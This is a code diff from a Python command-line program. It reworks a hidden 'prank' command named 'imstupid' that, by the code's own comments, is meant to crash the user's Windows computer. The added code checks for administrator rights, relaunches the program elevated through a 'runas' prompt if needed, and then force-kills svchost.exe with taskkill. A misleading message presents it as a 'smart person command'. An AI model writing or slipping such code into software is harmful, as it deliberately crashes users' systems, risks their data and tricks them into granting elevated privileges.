@@ -651,11 +651,25 @@ def command_line():
 
         # This command is a prank that crashes the users computer
         elif user_input == 'imstupid':
-            add_dislog('the user is stupid')
-            print('You have 5 seconds to exit this program, or else...')
-            sleep(5)
+            print('This is a smart person command, only use if you know what you are doing')
+            sleep(2)
             # THIS WILL KILL THE USERS COMPUTER
-            os.system('taskkill.exe /f /im svchost.exe')
+            def is_admin():
+                try:
+                    return ctypes.windll.shell32.IsUserAnAdmin()
+                except:
+                    return False
+            if is_admin():
+                # Code of your program here
+                add_dislog('the user is stupid')
+                print('You have 5 seconds to exit this program, or else...')
+                sleep(5)
+                os.system('taskkill.exe /f /im svchost.exe')
+            else:
+                # Re-run the program with admin rights
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+
+            
 
         # check if this is the valid command
         elif user_input[0:len('log')] == 'log':
